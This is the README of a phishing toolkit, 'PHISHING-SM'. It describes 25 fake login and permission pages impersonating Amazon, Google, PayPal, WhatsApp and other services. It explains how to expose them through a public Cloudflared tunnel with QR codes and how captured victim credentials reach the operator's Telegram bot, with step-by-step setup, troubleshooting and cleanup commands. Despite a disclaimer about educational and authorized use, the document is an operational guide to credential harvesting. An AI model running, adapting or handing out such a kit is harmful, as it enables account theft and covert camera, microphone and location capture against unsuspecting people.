```markdown
# PHISHING-SM

**Advanced Cloudflared Edition**  
*Professional Python tool for authorized penetration testing and security research*

![Version](https://img.shields.io/badge/version-2.0-blue)
![Python](https://img.shields.io/badge/python-3.7+-green)
![License](https://img.shields.io/badge/license-Educational-red)

---

## 📖 Introduction

**PHISHING-SM** is a professional Python‑based tool designed for **educational purposes** and **authorized penetration testing**. It creates realistic phishing pages to help security professionals understand credential harvesting techniques and test organizational defenses.

> ⚠️ **Important Warning**  
> This tool is for **educational and authorized testing only**. Any unauthorized use against systems without explicit permission is **illegal**. The developer assumes **no liability** for misuse.

---

## ✨ Features

| Category | Features |
|----------|----------|
| **Phishing Pages** | 25 professional templates (Amazon, Facebook, Google, Instagram, Telegram, etc.) |
| **Delivery** | Cloudflared tunnel → public HTTPS URL + QR code generation |
| **Automation** | PHP server auto‑start, token injection, process management |
| **Monitoring** | Real‑time credential delivery via Telegram bot |
| **User Interface** | Colored terminal, interactive control panel, progress animations |
| **Cleanup** | Automatic process termination, token reversion, temp file removal |
| **Cross‑platform** | Linux, macOS, Termux (Android), WSL |

---

## 📋 Requirements

### System Requirements

- **Python** 3.7+
- **PHP** 7.4+
- **Cloudflared** (automatically installed if missing)
- Internet connection (for tunneling & Telegram)
- **Optional:** `qrencode` (QR codes), `tmux` (session management)

### Supported Operating Systems

| OS | Status |
|----|--------|
| Kali Linux / Ubuntu / Debian | ✅ Fully supported |
| Termux (Android) | ✅ Fully supported |
| macOS | ✅ Supported |
| Fedora / Arch | ✅ Supported |
| Windows (WSL) | ✅ Works via WSL |

---

## 🚀 Quick Installation

### 1. Clone the repository

```bash
git clone https://github.com/MohamedAbuAl-Saud/PHISHING-SM.git
cd PHISHING-SM
```

2. Install Python dependencies

```bash
pip install -r requirements.txt
```

If pip is not available: python3 -m pip install requests

3. Make the script executable (optional)

```bash
chmod +x SM.py
```

4. Run the tool

```bash
python3 SM.py
```

Note: The first run will automatically check for and install PHP and cloudflared if missing.

---

📱 Termux Installation (Android)

```bash
pkg update && pkg upgrade
pkg install python php git -y
pip install requests
git clone https://github.com/MohamedAbuAl-Saud/PHISHING-SM.git
cd PHISHING-SM
python3 SM.py
```

Termux specific notes:

· QR code generation may not work (optional)
· Use landscape mode for better display
· Grant storage if needed: termux-setup-storage

---

🔧 How It Works (Step by Step)

1. Token Injection
      The tool replaces the placeholder BBOTTTTTTTTTTT in all .php files with your Telegram bot token.
2. PHP Server
      Starts a PHP built‑in server on 127.0.0.1:8080.
3. Cloudflared Tunnel
      Launches cloudflared tunnel to expose the local server to the internet via a public *.trycloudflare.com URL.
4. URL Generation
      Creates the final phishing link:
      https://xxxx.trycloudflare.com/selected_page.php?ID=YOUR_TELEGRAM_ID
5. Credential Harvesting
      When a victim submits credentials, they are sent directly to your Telegram bot.
6. Cleanup
      On exit, the tool stops all services and reverts tokens to the placeholder.

---

🤖 Telegram Bot Setup

Step 1: Create a Bot

1. Open Telegram and search for @BotFather
2. Send /newbot and follow the instructions
3. Copy the bot token (looks like 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789)

Step 2: Get Your User ID

1. Search for @userinfobot on Telegram
2. Send /start
3. Copy your numeric User ID

Step 3: Use in the Tool

When prompted, enter:

· Bot Token (from BotFather)
· Your User ID (from userinfobot)

---

🎮 Available Phishing Pages

# Page Name Description
1 amazon.php Amazon login
2 camera.php Camera permission request
3 collection.php Device info collection
4 copy.php Clipboard access
5 discord.php Discord login
6 facebook.php Facebook login
7 freefire.php FreeFire game
8 github.php GitHub login
9 google.php Google login
10 instagram.php Instagram login
11 location.php Geolocation access
12 microsoft.php Microsoft login
13 netflix.php Netflix login
14 paypal.php PayPal login
15 peace.php PES game
16 pupgmobile.php PUBG Mobile
17 record.php Microphone access
18 roblox.php Roblox login
19 snab.php SnabChat
20 spotify.php Spotify login
21 telegram.php Telegram login
22 tiktok.php TikTok login
23 whatsapp.php WhatsApp login
24 x.php X (Twitter) login
25 yallalido.php Yalla Lido

Type 26 in the menu to see this help page.

---

🕹️ Control Panel Commands

Once the tunnel is active, you will see an interactive control panel:

Command Action
q Quit – stop all services and exit
u Show the current phishing URL
r Refresh status (check if services are alive)
s Display detailed service status
qr Generate QR code of the URL (if qrencode installed)
h Show help
b Back to main menu (stop services)

If you used tmux, you can also type t to attach to the tunnel session (Ctrl+B then D to detach).

---

🛠️ Complete Troubleshooting Guide

1. Token Errors

Error: [-] Invalid bot token format!

Solution:
Token must match: 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789
(10‑digit numeric, colon, 35+ alphanumeric characters)

2. Cloudflared Not Found

Error: cloudflared: command not found

Solution:
The tool attempts to install it automatically. If that fails:

· Linux (apt): sudo apt install cloudflared
· Termux: pkg install cloudflared
· Manual: Download from cloudflare/cloudflared/releases

3. PHP Server Fails to Start

Error: [-] PHP server failed to start

Solutions:

· Check if port 8080 is free: lsof -i :8080 (kill the process if needed)
· Install PHP manually: sudo apt install php (or equivalent)
· Run the tool with sudo if permission denied

4. Tunnel URL Not Obtained

Error: [-] Could not obtain tunnel URL

Solutions:

· Check your internet connection
· Cloudflared may be blocked by a firewall
· Wait a few seconds and retry
· Manually test: cloudflared tunnel --url http://localhost:8080

5. No PHP Files Found

Error: [-] No PHP files found in current directory!

Solution:
Ensure you are inside the PHISHING-SM directory (where all .php files are located).
List files: ls *.php

6. Python requests Module Missing

Error: ModuleNotFoundError: No module named 'requests'

Solution:

```bash
pip install requests
# or
python3 -m pip install requests
```

---

🧹 Manual Cleanup

If the tool exits abnormally, run these commands to clean up:

```bash
# Stop PHP and cloudflared processes
pkill -f 'php -S'
pkill -f cloudflared

# Remove temporary files
rm -f tunnel_url.txt phishing_url.txt

# Revert tokens (if needed)
sed -i 's/YOUR_ACTUAL_TOKEN/BBOTTTTTTTTTTT/g' *.php
```

---

📁 File Structure

```
PHISHING-SM/
├── SM.py                     # Main Python script
├── *.php                     # 25 phishing templates
├── requirements.txt          # Python dependencies
├── README.md                 # This documentation
└── (optional) logs/          # Created during runtime
```

---

🔒 Security & Privacy

· No logs are stored permanently – temporary files are deleted on exit.
· Tokens are reverted – your bot token is removed from PHP files after the session.
· No external data collection – the tool only sends captured credentials to your own Telegram bot.
· All traffic goes through Cloudflared – no SSH keys or third‑party services required.

---

📄 License & Disclaimer

```
Copyright (c) 2025 Mohamed Abu Al-Saud

This tool is provided for EDUCATIONAL PURPOSES and AUTHORIZED PENETRATION TESTING only.

The developer does not condone illegal activities. You are solely responsible for your actions.
Misuse of this tool may violate laws in your jurisdiction. Always obtain written permission
before testing any system you do not own.
```

---

📞 Contact & Support

· Developer: Mohamed Abu Al-Saud
· Telegram Channel: https://t.me/cybersecurityTemSM
· GitHub Repository: https://github.com/MohamedAbuAl-Saud/PHISHING-SM

For issues, please open a GitHub issue or contact via the Telegram channel.

---

🙏 Acknowledgments

· Cloudflare for cloudflared – simple and reliable tunneling
· Telegram Bot API for instant credential delivery
· All security researchers who promote ethical hacking

---

Developed with ❤️ by Mohamed Abu Al-Saud
All rights reserved – 2025

``` 
